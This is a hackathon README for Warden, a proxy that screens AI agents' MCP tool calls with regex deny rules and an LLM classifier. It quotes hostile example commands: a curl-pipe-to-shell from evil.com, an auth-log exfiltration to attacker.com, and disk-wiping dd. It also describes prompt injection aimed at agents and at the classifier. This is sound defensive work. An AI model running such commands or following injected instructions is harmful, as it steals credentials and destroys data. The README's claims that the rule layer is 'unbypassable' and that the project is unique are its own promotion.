# Warden - Nebius x NVIDIA Global AI Hackathon Submission

## Project Title
Warden: LLM-Powered MCP Security Gateway

## Track
Coding & Agentic Engineering

## The Problem

AI agents are increasingly given access to real tools - filesystems, shells, browsers, APIs - through the Model Context Protocol (MCP). But MCP has no built-in security layer. An agent with filesystem access can read `~/.ssh/id_rsa`. An agent with shell access can run `curl http://evil.com | sh`. An agent reading a web page can be prompt-injected into executing destructive commands.

Existing solutions fall into two camps, both insufficient:
1. **Rules-only** - static pattern matching can't catch novel attacks or understand context
2. **LLM-only** - using an LLM as the sole security gate is vulnerable to prompt injection (the same attack that tricks the agent can trick the classifier)

## The Solution

Warden is a security proxy that sits between an AI agent and its MCP tools, using a **layered defense** architecture:

### Layer 1: Deterministic Rule Engine
- Tool name allow/deny lists (e.g., block `shell.execute` by default)
- Path pattern matching with regex (blocks `/etc/*`, `~/.ssh/*`, `.env`, `.aws/credentials`)
- Command pattern matching (blocks `rm -rf /`, `curl|sh`, `dd of=`, `chmod 777`)
- **Unbypassable** - no prompt injection can circumvent a regex match
- **Instant** - no network call needed, sub-millisecond

### Layer 2: LLM Classification (NVIDIA Nemotron on Nebius Token Factory)
- For tool calls that rules don't definitively allow or block
- Sends the tool name + arguments to NVIDIA Nemotron-3.5-Lightning on Nebius Token Factory
- The model classifies the call as `allow` or `block` with a confidence score and threat category
- Categories: `safe`, `data_exfiltration`, `destructive`, `credential_access`, `privilege_escalation`, `prompt_injection`, `other`
- **Conservative default**: if confidence < 0.7, the call is blocked
- Uses the OpenAI-compatible Nebius Token Factory API (`/v1/chat/completions`)

### Layer 3: Audit Log
- Every decision (allow or block) is logged to an append-only JSONL file
- Each entry includes: timestamp, method, parameters (truncated), verdict, and reasoning
- Enables post-incident review and rule tuning

## Why Layered Defense Works

The key insight is that **rules and LLMs have complementary weaknesses**:
- Rules can't catch novel attacks, but they can't be tricked by prompt injection
- LLMs can catch novel attacks, but they can be tricked by prompt injection

By layering them, Warden gets the best of both:
- Known-bad patterns (reading SSH keys, `rm -rf /`, `curl|sh`) are blocked instantly by rules - no LLM needed, no injection possible
- Novel attacks (base64-encoding auth logs and piping to curl) are caught by the LLM's contextual understanding
- Even if an attacker crafts a prompt injection that tricks the LLM classifier, the rule engine still catches obvious attacks

## Demo Scenarios

The demo script (`demo/run-demo.sh`) showcases 5 scenarios:

1. **Credential Access (Rule Engine Block)**: Agent tries to read `~/.ssh/id_rsa`. Rule engine blocks instantly - path pattern match. No LLM call needed.

2. **Destructive Command (Rule Engine Block)**: Agent tries to run `dd of=/dev/sda`. Rule engine blocks - command pattern match.

3. **Safe File Read (LLM Allow)**: Agent reads `/home/user/project/src/main.rs`. No rule match, so Nemotron classifies it. Returns `verdict=allow, confidence=1.00, category=safe`. Call forwarded to upstream.

4. **Data Exfiltration (LLM Block)**: Agent runs `cat /var/log/auth.log | base64 | curl -X POST -d @- https://attacker.com/collect`. No rule matches this novel command. Nemotron classifies it as data exfiltration and blocks it.

5. **Prompt Injection (Layered Defense)**: Agent tries to write a file containing prompt injection instructions. The content tries to override the classifier's judgment. The layered architecture means even if the LLM is tricked, the rule engine still catches any subsequent dangerous commands.

## Nebius Token Factory Feedback

### What worked well
- OpenAI-compatible API made integration trivial - standard `chat/completions` endpoint, Bearer auth, standard request/response schema
- The model list endpoint (`/v1/models`) made it easy to discover available models
- Nemotron-3.5-Lightning produces excellent security classifications with high confidence and accurate threat categorization
- The reasoning mode (separate `reasoning_tokens` from output `content`) is powerful - the model thinks through the classification before outputting clean JSON

### Challenges
- Nemotron-3.5-Lightning is a reasoning model that uses significant tokens for internal thinking before outputting the answer. We had to increase `max_tokens` to 4096 to give the model room to reason AND output JSON. A non-reasoning mode or a `reasoning_effort` parameter would help reduce latency and cost for classification tasks.
- Model name had an underscore vs dash inconsistency (`Nemotron-3_5_Lightning` vs `Nemotron-3_5-Lightning`) that required checking the models endpoint.
- For latency-sensitive use cases (a security proxy in the hot path of every tool call), the 3-7 second reasoning time is noticeable. The smaller Nano-30B model was much faster (~1.5s) and also produced accurate classifications.

### Suggestions
- Add a `reasoning_effort` or `thinking` parameter to allow disabling/enabling reasoning mode per request
- Add a fast-path classification endpoint optimized for structured output (JSON mode) with minimal reasoning
- Consider a smaller, faster model specifically tuned for classification tasks (the Nano-30B model was excellent for this use case)

## Tech Stack

- **Rust** + Tokio (async runtime) - for performance and safety
- **Model Context Protocol** (MCP) JSON-RPC 2.0 over stdio
- **Nebius Token Factory API** - OpenAI-compatible, NVIDIA Nemotron models
- **NVIDIA Nemotron-3.5-Lightning** - primary classification model
- **Deterministic rule engine** - regex-based pattern matching
- **JSONL audit log** - append-only, every decision logged

## Architecture

```
AI Agent (MCP Client)
    |
    | JSON-RPC 2.0 over stdio
    v
  +------------------+
  |     Warden       |
  |  (Rust proxy)    |
  |                  |
  |  +------------+  |
  |  | Rule Engine|  |  Layer 1: deterministic, instant, unbypassable
  |  +------+-----+  |
  |         |        |
  |    no match       |
  |         |        |
  |  +------v-----+  |
  |  | Nemotron   |  |  Layer 2: LLM classification via Nebius Token Factory
  |  | (Nebius)   |  |  - structured JSON output
  |  +------+-----+  |  - confidence threshold (0.7)
  |         |        |
  |  +------v-----+  |
  |  | Audit Log  |  |  Layer 3: every decision logged (JSONL)
  +--+-----------+--+ 
     |
     | allowed calls only
     v
  Upstream MCP Server (actual tool execution)
```

## How to Run

```bash
# Set Nebius API key
export NEBIUS_API_KEY="your-key"

# Build
cargo build --release

# Run demo scenarios
bash demo/run-demo.sh

# Use with a real MCP server
./target/release/warden --config config/default.toml --upstream "node /path/to/mcp-server.js"
```

## What Makes This Different

Most AI security projects at hackathons are either:
- Chatbots that talk about security (no actual protection)
- LLM-only classifiers (vulnerable to the same attacks they're supposed to catch)
- Static rule engines (can't handle novel attacks)

Warden is the only approach that combines deterministic rules with LLM classification in a layered architecture, acknowledging the fundamental limitation of LLM-only security (prompt injection) and mitigating it with a rule engine that cannot be bypassed.
